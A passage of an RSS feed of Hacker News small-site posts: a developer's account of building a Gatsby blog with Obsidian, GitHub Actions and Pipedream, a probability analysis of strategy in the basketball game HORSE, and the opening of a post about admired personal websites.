            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Buzzword.engineering Tech Stack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25556272">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | https://buzzword.engineering/post/blog-tech-stack | <a href="https://web.archive.org/web/*/https://buzzword.engineering/post/blog-tech-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span><strong>Spoiler Alert</strong></h5></p><p>It was, in fact, possible.</p></div>
<p>Anyway, here's Buzzword Engineering's inaugural blog post. If you like it, go give me a github star on the <a href="https://github.com/steven-terrana/steven-terrana.github.io" target="_blank" rel="nofollow noopener noreferrer">blog repo</a> or something. It's a nice dopamine boost and fuels my self-worth. </p>

<p>Let's dive in. Here's a digram for those visual learners out there. </p>
<p><span>
      <a href="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ac56/overview.webp 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d3be9/overview.webp 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e46b2/overview.webp 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e97dc/overview.webp 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/webp">
        <source srcset="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/8ff5a/overview.png 240w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/e85cb/overview.png 480w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png 960w,
https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/45662/overview.png 1410w" sizes="(max-width: 960px) 100vw, 960px" type="image/png">
        <img src="https://buzzword.engineering/static/f0e7c507dc593d346366fe97b0306a5a/d9199/overview.png" alt="This diagram shows an overview of buzzword.engineering tech stack and associated automation" title="This diagram shows an overview of buzzword.engineering tech stack and associated automation" loading="lazy">
      </picture>
  </a>
    </span></p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span><strong>Excalidraw is Dope</strong></h5></p><p>If you haven't heard of it, stop reading this and go play with <a href="https://excalidraw.com/" target="_blank" rel="nofollow noopener noreferrer">Excalidraw</a> and then come back. It's the tool I used to sketch out this diagram.</p></div>
<h2 id="obsidian"><a href="#obsidian" aria-label="obsidian permalink"></a>Obsidian</h2>
<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>
</ol>
<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>using local vault path: </span><span><span>${</span>siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>}</span></span><span>`</span></span><span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span>'gatsby-source-filesystem'</span><span>,</span>
    options<span>:</span> <span>{</span>
      path<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>vaultPath<span>,</span>
      name<span>:</span> <span>'local_obsidian'</span><span>,</span>
      ignore<span>:</span> <span>[</span> <span>"**/.git/**/*"</span><span>,</span> <span>"**/.obsidian/**/*"</span><span>,</span> <span>"**/Templates/**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span> <span>else</span><span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>"fetching from remote repo: "</span><span>,</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>)</span>
  config<span>.</span>plugins<span>.</span><span>unshift</span><span>(</span><span>{</span>
    resolve<span>:</span> <span><span>`</span><span>gatsby-source-git</span><span>`</span></span><span>,</span>
    options<span>:</span> <span>{</span>
      name<span>:</span> <span><span>`</span><span>obsidian</span><span>`</span></span><span>,</span>
      remote<span>:</span> siteConfig<span>.</span>obsidian<span>.</span>repo<span>,</span>
      patterns<span>:</span> <span>[</span> <span>"!**/Templates/**/*"</span><span>,</span> <span>"**/*"</span> <span>]</span>
    <span>}</span>
  <span>}</span><span>)</span>
<span>}</span></code></pre></div>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>
<div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></p><p>I wanted to insert a gif of the filtering taking place. Apparently that's easier said than done with Gatsby and<code>gatsby-transform-remark</code>.  I'll update this post once I get gifs working 🙄.</p></div>
<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>
  
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>trigger</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
     <span>-</span> <span>name</span><span>:</span> Trigger Upstream Blog Action
        <span>run</span><span>:</span> <span>|</span><span>
          curl -XPOST \
          -u "${{ secrets.PAT_USERNAME}}:${{secrets.PAT_TOKEN}}" \
          -H "Accept: application/vnd.github.everest-preview+json" \
          -H "Content-Type: application/json" \
          https://api.github.com/repos/steven-terrana/steven-terrana.github.io/dispatches \
          --data '{"event_type": "blog"}'</span></code></pre></div>
<h3 id="step-2-github-action-on-the-blog-repo"><a href="#step-2-github-action-on-the-blog-repo" aria-label="step 2 github action on the blog repo permalink"></a>Step 2: GitHub Action on the Blog Repo</h3>
<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish
<span>on</span><span>:</span>
  <span>repository_dispatch</span><span>:</span>
  <span>workflow_dispatch</span><span>:</span>

<span>jobs</span><span>:</span>
  <span>build-deploy-notify</span><span>:</span>
    <span>runs-on</span><span>:</span> ubuntu<span>-</span>latest
    <span>steps</span><span>:</span>
      
      <span>-</span> <span>name</span><span>:</span> Checkout Code 🛎
        <span>uses</span><span>:</span> actions/checkout@v2
        <span>with</span><span>:</span> 
          <span>persist-credentials</span><span>:</span> <span>false</span>
       <span>-</span> <span>name</span><span>:</span> Install &amp; Build 🔧
        <span>run</span><span>:</span> <span>|</span><span>
          npm ci
          npm run build
          echo "buzzword.engineering" &gt; public/CNAME</span>
        <span>env</span><span>:</span> 
          <span>PAT_USER</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_USER <span>}</span><span>}</span>
          <span>PAT_TOKEN</span><span>:</span> $<span>{</span><span>{</span> secrets.PAT_TOKEN <span>}</span><span>}</span>
      <span>-</span> <span>uses</span><span>:</span> peaceiris/actions<span>-</span>gh<span>-</span>pages@v3
        <span>with</span><span>:</span>
          <span>github_token</span><span>:</span> $<span>{</span><span>{</span> secrets.GITHUB_TOKEN <span>}</span><span>}</span>
          <span>publish_dir</span><span>:</span> public
          <span>force_orphan</span><span>:</span> <span>true</span>  </code></pre></div>
<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>
<li>I use the <code>peaceiris/actions-gh-pages</code> action to publish the site. </li>
</ol>
<p>All in all, this was a pretty painless setup. </p>
<h3 id="step-3-automating-tweets"><a href="#step-3-automating-tweets" aria-label="step 3 automating tweets permalink"></a>Step 3: Automating Tweets</h3>
<p>So at this point, we've got content changes automatically getting deployed to GitHub Pages. The whole process takes about <strong>three minutes</strong> from commit to publish. </p>
<p>The last piece was to automate letting all of you know about the whatever new insightful thing I had to say! </p>
<p>I had stumbled on <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> before through targeted ads and sort of ignored it until I saw <a href="https://twitter.com/rawkode" target="_blank" rel="nofollow noopener noreferrer">David McKay</a> talk about how much he loves it on <a href="https://rawkode.live/" target="_blank" rel="nofollow noopener noreferrer">rawkode.live</a>. Here's a <a href="https://youtu.be/Q8ZJ_5zxfmo" target="_blank" rel="nofollow noopener noreferrer">link to the stream</a>!</p>
<p>I went into this adventure thinking I was going to have to do all kinds of fancy logic and scripting to make this possible. I was wrong. </p>
<p>After setting up a Pipedream account, starting looking at what event sources were available to trigger a workflow. Well, the Lumen gatsby …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://buzzword.engineering/post/blog-tech-stack">https://buzzword.engineering/post/blog-tech-stack</a></em></p>]]>
            </description>
            <link>https://buzzword.engineering/post/blog-tech-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556272</guid>
            <pubDate>Mon, 28 Dec 2020 02:56:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's the best strategy when playing HORSE? (basketball)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25556148">thread link</a>) | @rishicomplex
<br/>
December 27, 2020 | https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html | <a href="https://web.archive.org/web/*/https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p><strong>TL;DR</strong>: If you want to win at HORSE, it’s generally a much better strategy to attempt high percentage shots. It almost never makes sense to shoot crazy half-court shots or behind-the-back shots. As a general rule of thumb, never attempt shots that you can’t shoot at &gt;50%.</p>

<hr>

<p><br>
<a href="https://en.wikipedia.org/wiki/Variations_of_basketball#H-O-R-S-E">HORSE</a> is a popular basketball shooting game. The main choice a HORSE player must make is which spots on the basketball court to attempt shots from. What’s the best strategy to win at HORSE?</p>

<ul id="markdown-toc">
  <li><a href="#game-rules" id="markdown-toc-game-rules">Game rules</a></li>
  <li><a href="#expected-number-of-turns" id="markdown-toc-expected-number-of-turns">Expected number of turns</a>    <ul>
      <li><a href="#deriving-the-formula" id="markdown-toc-deriving-the-formula">Deriving the formula</a></li>
      <li><a href="#visualizing-the-expected-number-of-turns" id="markdown-toc-visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</a></li>
      <li><a href="#verification-via-simulation" id="markdown-toc-verification-via-simulation">Verification via simulation</a></li>
    </ul>
  </li>
  <li><a href="#analyzing-some-special-cases" id="markdown-toc-analyzing-some-special-cases">Analyzing some special cases</a>    <ul>
      <li><a href="#both-players-are-equally-good-shooters" id="markdown-toc-both-players-are-equally-good-shooters">Both players are equally good shooters</a></li>
      <li><a href="#player-1-is-a-slightly-better-shooter-than-player-2" id="markdown-toc-player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</a></li>
      <li><a href="#player-2-is-a-slightly-better-shooter-than-player-1" id="markdown-toc-player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</a></li>
    </ul>
  </li>
  <li><a href="#real-world-strategies" id="markdown-toc-real-world-strategies">Real world strategies</a></li>
</ul>

<h3 id="game-rules">Game rules</h3>
<p>The version of HORSE I’m analysing here involves two players. In the beginning, it’s Player 1’s turn. The player whose turn it is will be called “C”, and the other player will be called “O”.</p>
<ol>
  <li>C picks a spot on the basketball court and attempts a shot.
    <ul>
      <li>If C misses the shot, it is O’s turn, and we go back to 1.</li>
    </ul>
  </li>
  <li>If C makes the shot, O must now attempt the same shot.
    <ul>
      <li>If O makes the shot, C’s turn continues, and we go back to 1.</li>
      <li>If O misses the shot, they get a letter. C’s turn continues, and we go back to 1.</li>
    </ul>
  </li>
  <li>Once any player has gotten 5 letters, ie HORSE, they lose the game.</li>
</ol>

<p>On Player 2’s turn, Player 1 has no real strategy - they must simply try their best to make the shots that Player 2 makes. The only strategy a player can control is which shots they attempt when it’s their turn.</p>

<h3 id="expected-number-of-turns">Expected number of turns</h3>

<h4 id="deriving-the-formula">Deriving the formula</h4>

<p>Let us calculate the optimal shot on Player 1’s turn. Note that a “turn” lasts as long as the player whose turn it is does not miss their shot. We will assume that Player 1 will shoot the same optimal shot each time it is their turn. Let \(p_1\) be the probability that Player 1 makes this shot, \(p_2\) be the probability that Player 2 makes the same shot, and \(e_N\) be the expected number of turns for Player 1 to win \(N\) letters.</p>

<p>If Player 1 misses the shot, the expected number of turns going forward is \(1 + e_N\), since Player 1 has used up the current turn, and must restart in the same position next turn. If Player 1 makes the shot, and Player 2 misses the shot, the expected number of turns is \(e_{N-1}\), since the turn continues with one less letter to win. Finally, if Player 1 and Player 2 both make the shot, the expected number of turns is simply \(e_N\). Putting these together, we have</p><p>

\[\begin{equation}
e_N = (1 - p_1) (1 + e_N) + p_1 (1 - p_2) e_{N - 1} + p_1 p_2 e_N
\end{equation}\]

</p><p>Re-arranging and expanding for \(e_{N-1},e_{N-2}\ldots e_0\), we get</p><p>

\[\begin{eqnarray}
e_N - e_{N - 1} &amp;= \frac{1 - p_1}{p_1 (1 - p_2)} \\
\vdots \\
e_1 - e_0 &amp;= \frac{1 - p_1}{p_1 (1 - p_2)}
\end{eqnarray}\]

</p><p>\(e_0\) must be \(1\), since \(p_1=1, p_2=0 \implies e_1=1\). Adding the equations above and re-arranging, we get</p><p>

\[e_N = 1 + N\frac{1 - p_1}{p_1 (1 - p_2)}\]

</p><p>For the game of HORSE, \(N=5\), and so the expected number of turns to win HORSE is</p><p>

\[e_5 = 1 + 5\frac{1 - p_1}{p_1 (1 - p_2)} \tag{1} \label{eq:one}\]

</p><p>Our goal is to minimize \(e_5\). \(e_5\) increases with the inverse of the quantities \(\frac{p_1}{1 - p_1}\) and \((1 - p_2)\). Since the former grows much faster than the latter, we can intuit that increasing \(p_1\) is a lot more important than decreasing \(p_2\).</p>

<h4 id="visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</h4>

<p>Since this is a function of two variables, we can visualize it with a contour plot.</p>

<p><img src="https://rishicomplex.github.io/assets/formula.png" alt="Contour plot of function"></p>

<p>As the color gets darker, the expected number of turns decreases, ie we’re more likely to win. As we would expect, the plot gets darker for higher values of \(p_1\) and lower values of \(p_2\), ie to the right and bottom of the plot. What’s interesting to note is that the contour lines are “squeezed” more toward the right than the bottom, indicating that a high \(p_1\) has a stronger effect than a low \(p_2\). For example, if \(p_2=0\) and \(p_1=0.2\), \(\eqref{eq:one}\) gives us \(e_5=21\), whereas if \(p_1=1\) and \(p_2=0.8\) we get \(e_5=1\).</p>

<h4 id="verification-via-simulation">Verification via simulation</h4>

<p>Another way to calculate \(e_5\) empirically is to simulate \(G\) games for each value of \(p_1\) and \(p_2\), and then average the number of turns the game takes to finish over all the games. Doing this with \(G=1000\), I get this plot:</p>

<p><img src="https://rishicomplex.github.io/assets/simulation.png" alt="Contour plot of simulation"></p>

<p>which matches the previous plot. The squiggles are due to randomness.</p>

<h3 id="analyzing-some-special-cases">Analyzing some special cases</h3>

<p>In reality, \(p_1\) and \(p_2\) tend to be related to one another, since shots that are harder for one player tend to be harder for the other player as well.</p>

<p>Let us analyse some special cases, corresponding to the straight lines in the following plot.</p>

<p><img src="https://rishicomplex.github.io/assets/straight_lines.png" alt="Contour plot with straight lines"></p>

<h4 id="both-players-are-equally-good-shooters">Both players are equally good shooters</h4>
<p>This corresponds to the red line above. Here, \(p_1 = p_2\), and \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + \frac{5}{p_1}\]

</p><p>To minimize this, we should pick shots with a \(p_1\) as high as possible. For example, if we keep making layups at a probability of \(0.9\) each, we’d expect the game to be over in less than \(7\) turns.</p>

<h4 id="player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</h4>

<p>Let’s say Player 1 always shoots 10% better than Player 2 for any shot. That is, \(p_2 = min(p_1 - 0.1, 0)\) (yellow line above), and when \(p1&gt;0.1\), \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (1.1 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_better.png" alt="Player 1 better"></p>

<p>It is minimized at \(p_1=1\), where \(e_5=1\), that is, the game ends in one turn. Again, Player 1 wants to pick their highest probability shot.</p>

<h4 id="player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</h4>

<p>Here, we set \(p_2 = p_1 + 0.1\) (orange line above), which gives us for \(p_1 &lt; 0.9\)</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (0.9 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_worse.png" alt="Player 1 worse"></p>

<p>Interestingly, we cannot simply maximize \(p_1\) here, because once \(p_2\) gets closer to \(1\), we can never win. However, the optimal \(p_1\) is still pretty high, at around \(p_1=0.684\), giving \(e_5=11.7\). If Player 2 (for whom \(e_5\) looks like the previous section) shoots shots at \(p_2&lt;0.4\) (eg three-point shots), they will lose the game, despite being a better shooter.</p>

<h3 id="real-world-strategies">Real world strategies</h3>

<p>In the real world, winning is not the only objective. You don’t want the game to take indefinitely long, and you’d be ridiculed if you kept taking layups. You also have no concrete way to estimate \(p_1\) and \(p_2\) (unless you’ve been playing an opponent for a long time and are keeping a tab on their shooting percentages), and so have to rely on intuition. Some general points to keep in mind:</p>

<ul>
  <li>You’re generally better off taking high percentage shots, even if you’re much better at a low-percentage shot than an opponent. As an example, let’s say you’ve been practicing half-court shots all year, and you can shoot a half court shot at an impressive 20% (\(p_1=0.2\)). You’re sure your opponent can’t shoot that shot if you make it (\(p_2=0\)). Your expected number of turns to win is still \(e_5=21\). Compare that to you shooting a 60% shot which your opponent can also make at 60% (eg a free throw), which lets you win in \(e_5=9.3\) turns. This is more than twice as good as the half court shot! This is because if you and your opponent both make the shot, it’s still your turn. Whereas if you miss your shot by attempting a low percentage shot, your turn is over. You can always win the game in 6-7 turns simply by taking layups at the same percentage as your opponent (assuming \(p_1\) of 0.8-0.9). If we set \(p_2=0\), and solve for \(e_5=7\), we get \(p_1 = 0.45\). That is, even if your opponent can’t make the shot you make at all, there’s generally no point in taking shots that have \(p_1 &lt; 0.45\) - you’re better off shooting layups.</li>
  <li>If you can guess \(p_1\) and \(p_2\) for a bunch of candidate shots, plug them into \(\eqref{eq:one}\) to figure out which shots are your best bet to win.</li>
  <li>Instead of practicing low percentage shots (like behind the backboard arc shots), practice your high percentage shots (like free throws or left handed layups) instead. If you and your opponent can both make a behind the backboard arc shot at 10%, and you practice to push yourself to 20%, you still go from winning in 51 turns to 23 turns. Compare that with converting your free throw from 60% to 70% - that pushes your expected turns from 9.3 to 6.4.</li>
  <li>Find novel-looking high percentage shots so that you can use an effective strategy while not getting ridiculed for just attempting layups. Examples are left handed close up shots, floaters, bank shots.</li>
</ul>

<p>I’d also recommend playing HORSE with modified rules, eg</p>
<ul>
  <li>No shots from inside the paint.</li>
  <li>No repeated shots from the same spot in a turn.</li>
  <li>If both players make three shots in a row, it’s Player 2’s turn.</li>
</ul>

<p>This should reduce the effectiveness of the layup strategy and make the game more fun.</p>

<hr>

<p><br>
The code for the plots in this post is <a href="https://colab.research.google.com/drive/18yF27zs80UF9TgFm4p7I5U4cDYn1V6A3?usp=sharing">here</a>.</p>

  </div>
</article>
<!-- Mathjax Support -->


      </div>
    </div></div>]]>
            </description>
            <link>https://rishicomplex.github.io/2020/12/25/whats-the-best-strategy-when-playing-horse.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556148</guid>
            <pubDate>Mon, 28 Dec 2020 02:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal Websites and Internet Writing]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555725">thread link</a>) | @healeycodes
<br/>
December 27, 2020 | https://healeycodes.com/personal-websites-and-internet-writing/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/personal-websites-and-internet-writing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I chose five personal websites out of the thirty or so I visit regularly and tried to understand what it is about them that utterly captures me.</p>
<p>Whether or not it is obvious to you, I have stolen many things from the following websites. Be it design tweaks, post ideas, or even turns of phrase. These websites are incredible and you should consume them.</p>
<p>Good artists borrow, great artists <del>steal</del> use the inspect tool.</p>

<p>I have been following Justin Duke’s writing for close to two years. His older page is now <a href="https://jmduke.com/">depreciated</a> and he posts to <em>arcana dot computer</em>, an <a href="https://github.com/jmduke/arcana.computer">open source</a> website filled with catalogs and footnotes and light-touch design. The main framework is Jekyll, with dynamic content powered by Airtable. The <a href="https://arcana.computer/miscellany/this-site.html">About</a> page of Justin’s website explains the development/design/ideas behind the website in rich detail. So in this section I’ll instead focus on how I <em>feel</em> about the website.</p>
<p><span>
